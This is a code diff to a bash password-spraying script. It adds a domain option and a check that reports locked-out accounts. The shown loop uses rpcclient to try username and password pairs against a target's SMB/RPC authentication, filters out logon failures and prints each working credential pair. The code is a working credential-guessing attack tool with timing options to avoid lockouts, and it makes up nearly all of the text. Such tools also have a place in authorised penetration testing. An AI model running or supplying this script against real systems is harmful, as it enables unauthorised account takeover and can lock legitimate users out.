@@ -64,6 +64,7 @@ while [[ $# -gt 0 ]]; do
                         echo "-P/--passwordList is the list of passwords you wish to spray"
                         echo "-a/--attemptsPerLockoutPeriod is the amount of attempts the script will spray before wating the lockout time. Default set to 0!"
                         echo "-l/--lockoutPeriodInMinutes is the amount of minutes the script will wait between each spray campagin. Default set to 0!"
+                        echo "-d/--domain is the domain you want to target"
                         echo "-s/--stoponlock is the bolean value to stop on account lockout. Only flag needs to be set, no value needed!WARNING NOT IMPLEMENTED YET, WILL GET TO THIS"
                         exit 1
                         ;;
@@ -105,11 +106,15 @@ do
 
                         if [[ ${found[@]} != $user ]]
                         then
-                                res=$(rpcclient -U "$DOMAIN\\$user%$pass" -c "getusername;quit" $TARGET 2>&1 |grep -v "NT_STATUS_LOGON_FAILURE" |tr -d '\n')
+                                res=$(rpcclient -U "$DOMAIN\\$user%$pass" -c "getusername;quit" $TARGET 2>&1 |grep -v "NT_STATUS_LOGON_FAILURE" |tr -d '\n') 
                                 if [[ $res == *"Authority"* ]]
                                 then
                                         echo "[+] Found $user:$pass"
                                         found+=("$user")
+                                elif [[ $res == *"LOCKED"* ]]
+                                then
+                                        echo "[-] WARNING! ACCOUNT LOCKED DETECTED" #Need to add logic to see if this is the first time we see this account locked or not
+                                        echo "[-] $user is locked out"
                                 fi
                         fi
 
